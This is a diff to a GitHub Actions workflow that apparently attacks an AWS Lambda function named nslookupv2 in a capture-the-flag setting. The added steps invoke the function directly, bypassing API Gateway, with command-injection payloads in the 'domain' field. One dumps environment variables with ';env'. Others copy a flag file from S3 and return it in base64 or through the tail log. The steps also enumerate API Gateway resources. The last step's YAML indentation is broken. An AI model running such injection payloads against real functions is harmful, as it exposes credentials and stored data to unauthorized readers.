@@ -43,22 +43,44 @@ jobs:
       - name: Wait a moment for async log delivery
         run: sleep 5
 
-      - name: Read Lambda CloudWatch logs (this is where output actually goes)
+      - name: Invoke Lambda directly, bypassing API Gateway
         run: |
-          echo "===== log streams ====="
-          aws logs describe-log-streams \
-            --log-group-name /aws/lambda/nslookupv2 \
-            --order-by LastEventTime --descending --limit 3 || true
+          echo "===== direct invoke: benign domain ====="
+          aws lambda invoke --function-name nslookupv2 \
+            --payload '{"domain":"example.com"}' \
+            --cli-binary-format raw-in-base64-out \
+            out1.json || echo "direct invoke denied"
+          cat out1.json 2>/dev/null || true
+          echo
+          echo "===== direct invoke: injection env ====="
+          aws lambda invoke --function-name nslookupv2 \
+            --payload '{"domain":";env"}' \
+            --cli-binary-format raw-in-base64-out \
+            out2.json || true
+          cat out2.json 2>/dev/null || true
+          echo
+          echo "===== direct invoke: injection s3 read flag to /tmp then base64 to logs ====="
+          aws lambda invoke --function-name nslookupv2 \
+            --payload '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f.txt --region us-east-1 && base64 /tmp/f.txt"}' \
+            --cli-binary-format raw-in-base64-out \
+            out3.json || true
+          cat out3.json 2>/dev/null || true
 
-          LATEST=$(aws logs describe-log-streams \
-            --log-group-name /aws/lambda/nslookupv2 \
-            --order-by LastEventTime --descending --limit 1 \
-            --query 'logStreams[0].logStreamName' --output text 2>/dev/null)
-
-          echo "Latest stream: $LATEST"
-
-          echo "===== log events ====="
-          aws logs get-log-events \
-            --log-group-name /aws/lambda/nslookupv2 \
-            --log-stream-name "$LATEST" \
-            --limit 50 || true
+      - name: Inspect API Gateway integration (mapping templates)
+        run: |
+          API_ID="3q931syi7b"
+          echo "===== resources ====="
+          aws apigateway get-resources --rest-api-id "$API_ID" || echo "denied"
+          echo "===== stages ====="
+          aws apigateway get-stages --rest-api-id "$API_ID" || echo "denied"
+          
+          
+          - name: Direct invoke with inline log tail (no CloudWatch perms needed)
+        run: |
+          aws lambda invoke --function-name nslookupv2 \
+            --payload '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f.txt --region us-east-1 && cat /tmp/f.txt"}' \
+            --cli-binary-format raw-in-base64-out \
+            --log-type Tail \
+            --query 'LogResult' --output text out4.txt || true
+          echo "===== decoded tail log ====="
+          cat out4.txt | base64 -d || true
